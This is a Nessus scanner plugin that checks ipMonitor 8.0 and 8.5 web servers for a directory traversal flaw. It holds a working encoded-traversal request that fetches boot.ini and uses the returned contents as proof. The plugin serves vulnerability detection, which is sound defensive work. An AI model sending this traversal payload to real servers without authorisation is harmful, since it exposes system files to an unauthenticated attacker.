#
# written by Gareth Phillips - SensePost PTY ltd (www.sensepost.com)
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref (9/18/09)

include("compat.inc");

if(description)
{
script_id(29697);
script_version ("$Revision: 1.8 $");
  script_osvdb_id(58153);
script_cvs_date("$Date: 2015/09/24 21:08:40 $");

script_name(english:"ipMonitor Encoded Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"A directory traversal flaw was discovered by SensePost to affect
ipMonitor versions 8.0 and 8.5.  Upon sending a specially formed
request to the web server, containing a series of '%2f..' sequences,
an unauthenticated attacker is able to traverse the web root and
obtain files within the remote file system." );
 script_set_attribute(attribute:"see_also", value:"https://support.ipmonitor.com/releasehistory.aspx" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ipMonitor 8.5, Build 1163 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/12/13");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

script_summary(english:"ipMonitor Directory Traversal");
script_category(ACT_GATHER_INFO);
script_copyright(english:"This script is Copyright (C) 2007-2015 SensePost");
script_family(english:"Web Servers");
script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
script_require_ports("Services/www", 80);
exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);

serv = strstr(banner, "Server:");
if(!serv)exit(0);
if(ereg(pattern:"^Server:.ipMonitor 8\.(0|5)", string:serv))
{
	exploit_url = "/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini";
	req = http_get(item:exploit_url, port:port);
	r = http_keepalive_send_recv(port:port, data:req);
if ("[boot loader]" >< r)
{
  report = string(
    "\n",
    "Nessus was able to retrieve an arbitrary file using the URL :\n",
    "\n",
    "  ", exploit_url, "\n",
    "\n",
    "which produced the following response :\n",
    "\n",
    r
  );
  security_warning(port:port, extra:report);
}
}
